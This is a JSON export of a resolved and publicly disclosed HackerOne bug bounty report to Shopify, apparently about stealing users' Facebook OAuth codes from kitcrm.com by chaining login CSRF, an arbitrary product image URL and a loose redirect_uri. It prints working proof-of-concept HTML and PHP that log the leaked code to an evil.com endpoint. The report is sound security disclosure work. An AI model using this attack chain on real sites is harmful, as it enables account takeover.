{"id":211477,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTE0Nzc=","url":"https://hackerone.com/reports/211477","title":"Stealing users' facebook access tokens - kitcrm.com","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-03-08T00:06:17.999Z","submitted_at":"2017-03-08T00:06:17.999Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"zombiehelp54","url":"/zombiehelp54","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-03-15T21:45:59.073Z","bug_reporter_agreed_on_going_public_at":"2017-03-15T21:45:59.016Z","team_member_agreed_on_going_public_at":"2017-03-14T21:04:13.504Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:**\nI have found a number of minor security vulnerabilities with no impact that when chained together will lead to an attacker being able to steal the current user's facebook access token provided for kitcrm.com\n\n**Description:**\n- In kitcrm.com, users register with their shopify account and the products in their store appear in **Priority Products** section.\n- When a user tries to edit a priority product, the submitted request will contain the product image url as a POST parameter.\n- Users can set their product image to anything, for example `http://evil.com/` will be accepted and added as the product image.\n- Now each time the user visits `https://www.kitcrm.com/seller/onboarding/1`, the page will request `http://evil.com/` as an image.\n- In `https://[shop].myshopify.com` there is no validation for the authenticity token, so there is a CSRF at the login endpoint (which has no impact at all)\n- Users of `kitcrm.com` are authenticated automatically by visiting the endpoint `https://www.kitcrm.com/users/auth/shopify?shop=zh5409.myshopify.com` which redirects to `https://zh5409.myshopify.com/admin/oauth/authorize?client_id=1333a1b83ccdf7a7.....` then they are redirected back to `kitcrm.com` and logged in.\n- Current `redirect_uri` configuration for Kitcrm facebook oauth application allows redirection to `https://www.kitcrm.com/\u003cANYTHING\u003e`\n\nChaining all of what I mentioned above together, here is how an attacker will be able to steal users' facebook access tokens: \n\n- An attacker registers a shopify store and then uses it to register a `kitcrm.com` account.\n- After that he modifies his priority product image url to `https://evil.com/log_token.php`\n- Then he tricks the victim into visiting a specially crafted HTML page that will:\n   - CSRF login the victim into the attacker's store\n   - CSRF login the victim into `kitcrm.com` \n   - Redirect the victim to `https://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621\u0026redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1\u0026response_type....` which will redirect him back to `https://www.kitcrm.com/seller/onboarding/1?code=[fb_token]`\n- After the victim is redirected from facebook to kitcrm.com, a request will be sent to `https://evil.com/log_token.php` with the user's CSRF token in the referrer header.\n- Now the attacker can store the token at his server and use it to access the user's facebook account.\n\n**Proof of concept:**\nI have created a live proof of concept that does all of that and stores the access token at `tokens.log` file. \nIt can be found here: https://alazzazpp.com/shopify/steal.html (Please note that you should allow your browser to access `https://alazzazpp.com` with https since it doesn't have a valid SSL certificate.) \nAlso, here is a PoC video:\n{F167006}\n\n**PoC Code:**\n\u003e Steal.html\n\n```html\n\u003cscript\u003e\nwindow.onload = function () { \n  window.setTimeout(function() {\n              document.getElementById(\"token\").innerHTML = \"\u003ciframe src='https://www.kitcrm.com/users/auth/shopify?shop=zh5409.myshopify.com'\u003e\u003c/iframe\u003e\";   \n          }, 5000);\n          window.setTimeout(function() {\n               window.open('https://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621\u0026redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1\u0026response_type=code\u0026scope=email%2Cmanage_pages%2Cread_insights%2Cads_management%2Cpublish_actions%2Cbusiness_management%2Cpublish_pages');\n          }, 10000);\nfinished = 0;\nvar xhttp = new XMLHttpRequest();\nxhttp.onreadystatechange = function() {\nif (this.readyState == 4 \u0026\u0026 this.status == 200 \u0026\u0026 this.responseText.length \u003e 0) {\n     document.getElementById(\"token\").innerHTML = \"\u003cb\u003eYour access token is: \u003cbr\u003e\u003c/b\u003e\" +this.responseText;\n     alert(this.responseText);\n     finished = 1;\n   }\n };\nfunction fetchToken(){ \n xhttp.open(\"GET\", \"tokens.log?\"+Math.random(), true);\n xhttp.send();\n if (finished == 1){\n   clearInterval(interval);\n }\n}\nvar interval = setInterval(function(){ fetchToken() } , 10000);\n}\n\u003c/script\u003e\n\u003ch4\u003eIf no window was opened click \u003ca href=\"https://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621\u0026redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1\u0026response_type=code\u0026scope=email%2Cmanage_pages%2Cread_insights%2Cads_management%2Cpublish_actions%2Cbusiness_management%2Cpublish_pages\" target=\"_blank\"\u003ehere\u003c/a\u003e: \n\n\u003cdiv id=\"token\"\u003e\u003ch3\u003eYour access token should appear soon.....\u003c/h3\u003e\u003c/div\u003e\n\u003ciframe src='data:text/html,\u003cform action=\"https://zh5409.myshopify.com/admin/auth/login\" method=\"post\"\u003e\n\u003cinput name=\"utf8\" value=\"\"\u003e\u003cinput name=\"redirect\"\u003e\u003cinput name=\"highlight=\u003e\u003cinput name=\"subdomain\" value=zh5409\u003e\u003cinput name=\"login\" value=███\u003e\u003cinput name=\"password\" value=P@ss123lol\u003e\u003cinput name=\"[remember]\" value=1\u003e\n\u003c/form\u003e\u003cscript\u003edocument.forms[0].submit()\u003c/script\u003e'\u003e\u003c/iframe\u003e\n\u003cdiv id=\"csrf_login\"\u003e\u003c/div\u003e\n```\n\n\u003e log_token.php\n\n```php\n\u003c?php\nheader(\"Access-Control-Allow-Origin: *\");\n$referrer = $_SERVER['HTTP_REFERER'];\n$token = substr($referrer, strpos($referrer, \"=\") + 1);    \n$fp = fopen('tokens.log', 'w');\nfwrite($fp, $token.\"\\n\");\nfclose($fp);\n?\u003e\n```\n\n**Recommended fix:**\nMitigation of this vulnerability is pretty simple, just set your facebook oauth application `redirect_uri` to the exact callback endpoint and remove the domain from the white list.","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":25,"voters":["delimitry","drsniper","kapytein","bogdantcaciuc","mpz","muhammad_uwais","supernatural","eveeez","xhzeem","kiraak-boy","and 15 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1525815,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nOur team is busy triaging and fixing HackerOne reports, and it may take us up to 1 week (or more) to triage any given issue. Don't worry, we'll get to yours!\n\nWhile you are waiting, you can read over our list of non applicable issues listed on our program page: https://hackerone.com/shopify. Make sure your issue isn't listed!","automated_response":true,"created_at":"2017-03-08T00:06:18.213Z","updated_at":"2017-03-08T00:06:18.213Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1531184,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for your report!\n\nWe have added the correct callback URI to the redirection whitelist on the Kit Facebook app configuration.\nOur next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon.","automated_response":false,"created_at":"2017-03-10T00:18:13.616Z","updated_at":"2017-03-10T00:18:13.616Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"zombiehelp54","url":"/zombiehelp54"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1541553,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Kit! ","automated_response":false,"created_at":"2017-03-14T21:04:06.086Z","updated_at":"2017-03-14T21:04:06.086Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"zombiehelp54","url":"/zombiehelp54"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1541554,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-03-14T21:04:13.530Z","updated_at":"2017-03-14T21:04:13.530Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1542074,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi can you please redact █████ from the report as well as removing the video attachment before disclosing this.\n\nThanks!","automated_response":false,"created_at":"2017-03-15T04:02:40.334Z","updated_at":"2017-03-15T14:32:53.126Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1543397,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We have removed the info as requested.","automated_response":false,"created_at":"2017-03-15T17:01:14.051Z","updated_at":"2017-03-15T17:01:14.051Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1544161,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks!","automated_response":false,"created_at":"2017-03-15T21:45:59.036Z","updated_at":"2017-03-15T21:45:59.036Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1544162,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-03-15T21:45:59.091Z","updated_at":"2017-03-15T21:45:59.091Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":3534,"category":"researcher","content":"Chaining minor bugs with no impact at all to steal facebook codes.\nMore to add here: Through this bug an attacker could steal `code` returned from facebook not the `access_token` itself.\nThe exploitation scenario I thought of was to use that code through `kitcrm.com` to access the victim's account and take advantage of granted permissions, however, after a conversation in Bug Bounty Forums turned out that facebook now requires validation for the exact `redirect_uri` used when obtaining the code (https://developers.facebook.com/docs/facebook-login/manually-build-a-login-flow#exchangecode) which makes this bug not exploitable since the `redirect_uri` used when the attacker obtained the code does not match the one the application sends to facebook server-side when obtaining the `access_token`.\n\n","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":36135,"username":"zombiehelp54","name":"Mahmoud G. ","bio":"Twitter: @Zombiehelp54 ","cleared":true,"website":"https://mahmoudsec.blogspot.com","location":"","created_at":"2015-07-07T10:16:23.553Z","url":"https://hackerone.com/zombiehelp54","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"hacker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}}]}